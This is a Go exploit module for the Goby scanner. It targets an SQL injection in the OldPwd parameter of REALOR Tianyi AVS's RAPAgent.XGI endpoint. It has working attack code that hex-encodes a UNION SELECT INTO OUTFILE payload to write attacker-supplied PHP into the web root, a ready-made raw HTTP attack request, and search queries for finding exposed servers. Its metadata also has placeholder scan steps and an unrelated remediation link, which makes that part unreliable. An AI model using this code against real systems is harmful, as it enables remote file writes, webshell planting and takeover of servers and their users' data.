package exploits

import (
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "REALOR Tianyi AVS RAPAgent.XGI File OldPwd Parameter SQL Injection Vulnerability",
    "Description": "<p>REALOR Tianyi AVS is an application virtualization platform with independent intellectual property rights and based on server computing architecture developed by Xi 'an Ruiyou Information Technology Information Co., LTD.</p><p>SQL Injection Vulnerability exists in the REALOR Tianyi AVS.In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "REALOR-Tianyi-AVS",
    "Homepage": "http://www.realor.cn/",
    "DisclosureDate": "2024-04-25",
    "PostTime": "2024-04-25",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "GobyQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "Level": "3",
    "Impact": "<p>SQL Injection Vulnerability exists in the REALOR Tianyi AVS.In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "<?php phpinfo();?>",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "REALOR 天翼应用虚拟化系统 RAPAgent.XGI 文件 OldPwd 参数 SQL 注入漏洞",
            "Product": "REALOR-天翼应用虚拟化系统",
            "Description": "<p>瑞友天翼应用虚拟化系统是西安瑞友信息技术资讯有限公司研发的具有自主知识产权，基于服务器计算架构的应用虚拟化平台。<br></p><p>瑞友天翼应用虚拟化系统存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.realor.cn/\">http://www.realor.cn/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>瑞友天翼应用虚拟化系统存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "REALOR Tianyi AVS RAPAgent.XGI File OldPwd Parameter SQL Injection Vulnerability",
            "Product": "REALOR-Tianyi-AVS",
            "Description": "<p>REALOR Tianyi AVS is an application virtualization platform with independent intellectual property rights and based on server computing architecture developed by Xi 'an Ruiyou Information Technology Information Co., LTD.</p><p>SQL Injection Vulnerability exists in the REALOR Tianyi AVS.In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>SQL Injection Vulnerability exists in the REALOR Tianyi AVS.In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	sendPayload64231asqwesadADSF123 := func(hostInfo *httpclient.FixUrl, sql, filename string) (*httpclient.HttpResponse, error) {
		filename = filename + `.XGI`
		uri := "/RAPAgent.XGI"
		sql = `' Union Select 1,2,3,4,5,6,'aaa',8,9,10,11,12,13,14,15,` + sql + `,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 into outfile '../../WebRoot/` + filename + `'-- 1`
		hexsql := hex.EncodeToString([]byte(sql))
		payload := `CMD=RePWD&User=1&UserAuthtype=6&OldPwd=` + hexsql + `&NewPwd1=6c44e5cd17f0019c64b042e4a745412a&NewPwd2=6c44e5cd17f0019c64b042e4a745412a`
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 20

		cfg.Header.Store("Content-Type", " application/x-www-form-urlencoded")
		cfg.Data = payload

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response")
		}
		checkRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		respCheck, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
		if err != nil {
			return nil, err
		}
		return respCheck, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(16)
			feature := goutils.RandomHexString(16)
			hexfeature := hex.EncodeToString([]byte(`<?php echo "` + feature + `";@unlink(__FILE__);?>`))
			sql := "0x" + hexfeature
			resp, err := sendPayload64231asqwesadADSF123(hostInfo, sql, filename)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, feature) {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + `/RAPAgent.XGI`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filename := goutils.RandomHexString(16)
			sql := "0x" + hex.EncodeToString([]byte(goutils.B2S(stepLogs.Params["sql"])))
			if attackType == "sql" {
				_, err := sendPayload64231asqwesadADSF123(expResult.HostInfo, sql, filename)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = "注入成功，访问地址：\n" + expResult.HostInfo.FixedHostInfo + "/" + filename + ".XGI"
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload64231asqwesadADSF123(expResult.HostInfo, sql, filename)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /RAPAgent.XGI HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

CMD=RePWD&User=1&UserAuthtype=6&OldPwd=2720556e696f6e2053656c65637420312c322c332c342c352c362c27616161272c382c392c31302c31312c31322c31332c31342c31352c307833393433363636323632363536333339343233393632333936313435333833342c30783363336637303638373032303730363837303639366536363666323832393362336633652c31372c31382c31392c32302c32312c32322c32332c32342c32352c32362c32372c32382c32392c33302c33312c333220696e746f206f757466696c6520272e2e2f2e2e2f576562526f6f742f306239376345453242443446383462312e584749272d2d2031&NewPwd1=6c44e5cd17f0019c64b042e4a745412a&NewPwd2=6c44e5cd17f0019c64b042e4a745412a`
			}
			return expResult
		},
	))
}
